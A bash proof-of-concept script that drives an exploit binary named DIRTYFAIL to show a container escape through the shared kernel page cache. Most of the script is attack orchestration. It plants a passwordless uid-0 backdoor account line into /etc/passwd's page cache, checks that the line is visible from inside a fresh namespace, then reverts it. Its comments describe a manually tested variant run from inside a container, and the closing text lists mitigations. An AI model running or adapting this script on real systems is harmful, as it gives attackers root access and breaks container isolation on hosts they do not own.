#!/usr/bin/env bash
#
# DIRTYFAIL — container-escape demonstration
#
# Demonstrates: the kernel page cache is global per-kernel. Namespaces
# (mount, pid, user, network) don't isolate it. Two processes on the
# same kernel — one in the host, one inside a fresh "container"
# (created via `unshare`) — see the SAME page-cache contents for
# /etc/passwd. So a page-cache write from either side affects both.
#
# What this script does:
#   1. Show host's /etc/passwd has no `dirtyfail` user (baseline)
#   2. Run `dirtyfail --exploit-backdoor` to plant a uid-0 line into
#      /etc/passwd's page cache (persistent — no auto-revert)
#   3. Spawn a fresh user/mount/PID-namespace via `unshare -c -m -p`
#      (the closest unprivileged-user analogue to a container) and
#      read /etc/passwd from inside the new namespace
#   4. Show the planted line is visible BOTH from the host AND from
#      inside the fresh namespace — proving that namespace boundaries
#      do not isolate the page cache
#   5. Revert via `dirtyfail --cleanup-backdoor`
#
# Why direction matters less than you'd think: the demo runs the
# exploit on the host and observes from inside the namespace, but the
# property demonstrated is symmetric — a malicious tenant inside a
# container could plant the same line and the host would see it (we
# tested that variant manually; it works the same way, but requires
# `--no-revert` to avoid auto-cleanup overwriting the proof). Running
# the exploit from the host avoids two complications:
#   - nested user namespaces interact poorly with the AA bypass dance
#     that --exploit-backdoor uses (EPERM on the inner unshare)
#   - corrupting the running SSH user's UID locks out future SSH logins
#     (StrictModes rejects ~/.ssh/authorized_keys when the file's
#      owner uid != logging-in uid)
# --exploit-backdoor targets a system pseudo-user line (sync/setroubleshoot/
# daemon) and never touches the running user, so it's SSH-safe.
#
# Usage:
#   ./tools/dirtyfail-container-escape.sh
#
# Env overrides:
#   DIRTYFAIL_BIN=/path/to/dirtyfail   (default: ./dirtyfail)

set -uo pipefail
# Don't `set -e`; some intermediate commands (unshare with PID-ns, the
# exploit binary itself) may exit non-zero on success-with-warnings or
# on hardened systems where preconditions fail. We check exit codes
# explicitly where they matter.

DIRTYFAIL_BIN="${DIRTYFAIL_BIN:-$(dirname "$0")/../dirtyfail}"
DIRTYFAIL_BIN="$(realpath "$DIRTYFAIL_BIN" 2>/dev/null || echo "$DIRTYFAIL_BIN")"

[[ -x "$DIRTYFAIL_BIN" ]] || {
  echo "[!] dirtyfail binary not at $DIRTYFAIL_BIN — run 'make' first" >&2
  exit 1
}

bold()  { printf '\033[1m%s\033[0m\n' "$*"; }
warn()  { printf '\033[1;33m[!]\033[0m %s\n' "$*"; }
info()  { printf '\033[1;34m[i]\033[0m %s\n' "$*"; }
ok()    { printf '\033[1;32m[+]\033[0m %s\n' "$*"; }
step()  { printf '\033[1;35m[*]\033[0m %s\n' "$*"; }

bold "============================================================="
bold "  DIRTYFAIL — container-escape demonstration"
bold "============================================================="
echo

# ---- Stage 1: baseline ------------------------------------------------
step "Stage 1: baseline — host /etc/passwd"
if grep -q '^dirtyfail:' /etc/passwd; then
  warn "host /etc/passwd already contains a 'dirtyfail' line."
  warn "Run \`$DIRTYFAIL_BIN --cleanup-backdoor\` first."
  exit 1
fi
ok "host /etc/passwd has no 'dirtyfail' user (clean baseline)"
echo
info "from inside a fresh unshare namespace, /etc/passwd looks identical:"
nscount="$(unshare -c -m bash -c 'grep -c "^dirtyfail:" /etc/passwd 2>/dev/null || echo 0' 2>&1 | tail -1)"
echo "  count of dirtyfail lines visible from inside namespace: $nscount"
echo

# ---- Stage 2: plant via host ------------------------------------------
step "Stage 2: run dirtyfail --exploit-backdoor on the host"
echo "        (plants 'dirtyfail::0:0:...:/:/bin/bash' into /etc/passwd's"
echo "         page cache — persistent until --cleanup-backdoor or reboot)"
echo
printf 'DIRTYFAIL\n' | "$DIRTYFAIL_BIN" --exploit-backdoor --no-shell --no-color 2>&1 | tail -10
echo

# ---- Stage 3: observe from fresh namespace ---------------------------
step "Stage 3: read /etc/passwd from INSIDE a fresh unshare namespace"
echo "        (the namespace was created AFTER the exploit ran — if"
echo "         namespaces isolated page cache, the new namespace would"
echo "         show the original /etc/passwd, not the poisoned one)"
echo
unshare -c -m bash -c '
  echo "  [inside namespace] uid='"$(id -u)"' (mapped via --map-current-user)"
  echo "  [inside namespace] mount-namespace is private to this shell"
  echo "  [inside namespace] grep dirtyfail /etc/passwd:"
  if grep "^dirtyfail:" /etc/passwd 2>&1 | sed "s/^/    /"; then :
  else echo "    (no dirtyfail line found)"
  fi
'
echo

# ---- Stage 4: also visible from host ---------------------------------
step "Stage 4: confirm host sees the same line"
HOST_LINE="$(grep '^dirtyfail:' /etc/passwd || true)"
if [[ -n "$HOST_LINE" ]]; then
  echo "  host: $HOST_LINE"
  echo
  warn "Both the host and the fresh namespace see the planted dirtyfail"
  warn "line. The kernel page cache is shared across all namespaces"
  warn "on the same kernel — namespace 'isolation' does not extend"
  warn "below the page-cache layer. Symmetrically, an exploit running"
  warn "inside a container (with the right preconditions) would plant"
  warn "the same line and the HOST would see it."
else
  warn "host /etc/passwd does NOT contain a 'dirtyfail' line — the"
  warn "exploit did not plant successfully. Possible causes:"
  warn "  (a) kernel is patched (CVE-2026-31431 fixed)"
  warn "  (b) LSM blocked the exploit (Ubuntu 26.04 hardening)"
  warn "  (c) preconditions missing — run \`$DIRTYFAIL_BIN --scan --active\`"
  exit 0
fi
echo

# ---- Stage 5: cleanup -------------------------------------------------
step "Stage 5: revert via --cleanup-backdoor"
"$DIRTYFAIL_BIN" --cleanup-backdoor --no-color 2>&1 | tail -5 || true
echo
if grep -q '^dirtyfail:' /etc/passwd; then
  warn "cleanup did not remove the line — try as root:"
  warn "  \`echo 3 | sudo tee /proc/sys/vm/drop_caches\`"
  exit 1
fi
ok "host /etc/passwd is clean again"
echo
bold "Demo complete. Takeaways:"
echo "  - Namespaces did NOT isolate the host's /etc/passwd page cache"
echo "    from the fresh container's view. The same property holds"
echo "    in reverse: a container exploit modifies host page cache."
echo "  - This applies to ALL kernel page-cache write CVEs in this"
echo "    family (CVE-2026-31431, 43284, 43500, and variants)."
echo "  - Mitigation: kernel patch, OR LSM hardening that denies the"
echo "    exploit's preconditions (apparmor_restrict_unprivileged_userns,"
echo "    AF_ALG/AF_RXRPC blacklists), OR drop privileges of any"
echo "    container that doesn't strictly need AF_ALG."
